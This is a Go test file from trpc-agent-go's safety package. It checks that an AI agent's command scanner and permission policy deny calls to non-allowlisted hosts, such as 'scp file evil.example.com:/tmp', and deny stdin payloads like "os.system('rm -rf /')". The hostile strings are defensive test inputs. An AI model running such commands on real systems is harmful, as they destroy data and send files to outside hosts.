//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

// #1: per-command grammar recognises scheme-less host operands (ssh/scp/curl)
// while still ignoring local file operands.
func TestSchemelessHostGrammar(t *testing.T) {
	deny := []string{
		"ssh evil.example.com ls",
		"curl evil.example.com",
		"wget evil.example.com/x",
		"scp file evil.example.com:/tmp",
	}
	for _, cmd := range deny {
		if r := scanWS(t, cmd); r.Decision != DecisionDeny || !hasRule(r, RuleNetNonWhitelist) {
			t.Errorf("%q should deny non-allowlisted host, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	allow := []string{
		"ssh github.com",
		"curl proxy.golang.org/list",
		"scp file user@github.com:/tmp",
	}
	for _, cmd := range allow {
		if r := scanWS(t, cmd); r.Decision != DecisionAllow {
			t.Errorf("%q should allow allowlisted host, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
}

// #2: interactive write_stdin tools are guarded; a non-empty write is denied,
// an empty poll is left to the tool.
func TestWriteStdinGuarded(t *testing.T) {
	p := NewPermissionPolicy(NewScanner(nil))
	d, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_write_stdin",
		Arguments: []byte(`{"chars":"import os; os.system('rm -rf /')\n"}`),
	})
	if d.Action != tool.PermissionActionDeny {
		t.Errorf("non-empty stdin write should deny, got %s", d.Action)
	}
	d2, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "hostexec_write_stdin", Arguments: []byte(`{"chars":""}`),
	})
	if d2.Action != tool.PermissionActionAllow {
		t.Errorf("empty stdin poll should allow, got %s", d2.Action)
	}
}

// #3: stdin fed to a command is checked — denied for an interpreter, ask
// otherwise — including through the permission adapter.
func TestStdinScanned(t *testing.T) {
	sc := NewScanner(nil)
	interp := sc.Scan(context.Background(), ScanInput{
		ToolName: "exec_command", Backend: BackendHostExec,
		Command: "python3", Stdin: "import os; os.system('rm -rf /')\n",
	})
	if interp.Decision != DecisionDeny || !hasRule(interp, RuleStdinProvided) {
		t.Errorf("interpreter stdin should deny, got %s %+v", interp.Decision, interp.Findings)
	}
	data := sc.Scan(context.Background(), ScanInput{
		ToolName: "exec_command", Backend: BackendHostExec, Command: "cat", Stdin: "some data",
	})
	if data.Decision != DecisionAsk || !hasRule(data, RuleStdinProvided) {
		t.Errorf("stdin to a non-interpreter should ask, got %s %+v", data.Decision, data.Findings)
	}
	pp := NewPermissionPolicy(sc)
	d, _ := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "exec_command",
		Arguments: []byte(`{"command":"python3","stdin":"import os; os.system('rm -rf /')"}`),
	})
	if d.Action != tool.PermissionActionDeny {
		t.Errorf("workspace_exec stdin bypass should deny, got %s", d.Action)
	}
}

// #4: a policy file with a second document / trailing value is rejected.
func TestLoadPolicyRejectsTrailingDocuments(t *testing.T) {
	dir := t.TempDir()
	yml := filepath.Join(dir, "p.yaml")
	os.WriteFile(yml, []byte("version: 1\n---\ndenied_commands: []\n"), 0o600)
	if _, err := LoadPolicy(yml); err == nil {
		t.Error("a second yaml document should be rejected")
	}
	js := filepath.Join(dir, "p.json")
	os.WriteFile(js, []byte(`{"version":1}{"version":2}`), 0o600)
	if _, err := LoadPolicy(js); err == nil {
		t.Error("trailing json content should be rejected")
	}
}

// #5: a list mutated on an already-compiled policy still takes effect, because
// the scanner recompiles a snapshot.
func TestMutatedPolicyRecompiled(t *testing.T) {
	p := DefaultPolicy()
	p.DeniedCommands = append(p.DeniedCommands, "kubectl")
	sc := NewScanner(p)
	r := sc.Scan(context.Background(), ScanInput{
		ToolName: "t", Backend: BackendWorkspaceExec, Command: "kubectl delete ns prod",
	})
	if r.Decision != DecisionDeny || !hasRule(r, RuleDeniedCommand) {
		t.Errorf("appended denied command should be enforced, got %s %+v", r.Decision, r.Findings)
	}
}
